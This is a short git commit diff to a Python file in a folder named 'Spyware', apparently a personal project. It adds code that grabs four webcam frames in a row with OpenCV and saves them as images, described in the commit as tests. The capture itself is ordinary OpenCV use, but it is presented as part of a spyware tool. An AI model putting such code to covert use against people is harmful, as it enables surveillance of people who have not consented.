88dd1de6e6d2f0118a27b9a2f1aff59db1ea4aa5
Hjt <ronaldohjt2@gmail.com>
2024-04-01 12:22:00 +0330

    feat(tests)
    added tests for webcam
    all tests are passed

--- Spyware/Webcam/webcam-access.py
+++ Spyware/Webcam/webcam-access.py
@@ -1,9 +1,10 @@
 from cv2 import VideoCapture, imwrite, destroyAllWindows
 from cv2.typing import MatLike
+from time import sleep
 
 
-def take_picture(path: str) -> bool:
-    camera = VideoCapture(0)
+def take_picture(path: str, camera_index) -> bool:
+    camera = VideoCapture(camera_index)
     status, pic = camera.read()
     if status:
         save_picture(path, pic)
@@ -15,3 +16,12 @@ def take_picture(path: str) -> bool:
 
 def save_picture(path: str, frame: MatLike) -> None:
     imwrite(path, frame)
+
+if __name__ == '__main__':
+    take_picture('Images/test1.png', 0)
+    sleep(.5)
+    take_picture('Images/test2.png', 0)
+    sleep(.5)
+    take_picture('Images/test3.png', 0)
+    sleep(.5)
+    take_picture('Images/test4.png', 0)
